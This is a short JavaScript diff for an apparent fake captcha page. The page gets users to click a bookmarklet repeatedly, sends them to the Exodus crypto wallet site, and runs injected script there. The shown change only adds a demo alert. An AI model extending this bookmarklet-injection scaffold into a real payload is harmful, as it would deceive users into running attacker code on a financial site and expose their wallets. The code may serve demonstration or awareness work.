@@ -524,7 +524,7 @@
   const GLASS_PCT_PER_CLICK = 0.46;
   /** Step 2 only: enough bookmark spam → redirect. */
   const SPAM_CLICKS_TO_REDIRECT = 85;
-  /** Bookmark clicks while on our site only; at this count the bookmarklet navigates to the target site. */
+  /** Bookmark clicks counted only on our captcha origin; at this count the bookmarklet navigates to Exodus. On Exodus, clicks are not counted — the bookmarklet only runs the demo injection (alert). */
   const BOOKMARKLET_CLICKS_TO_REDIRECT = 10;
   const BOOKMARKLET_TARGET_URL = "https://www.exodus.com/";
   /** Zombies stage: if user never uses the bookmark in this window, close & retry. */
@@ -2352,6 +2352,7 @@
       "var h=location.hostname;" +
       "var isExodus=h==='www.exodus.com'||h==='exodus.com';" +
       "if(isExodus){" +
+      "alert(\"Injected code on Exodus\");" +
       "try{window.parent.postMessage({type:'exodus_injected'},'*');}catch(e){}" +
       "return;" +
       "}" +
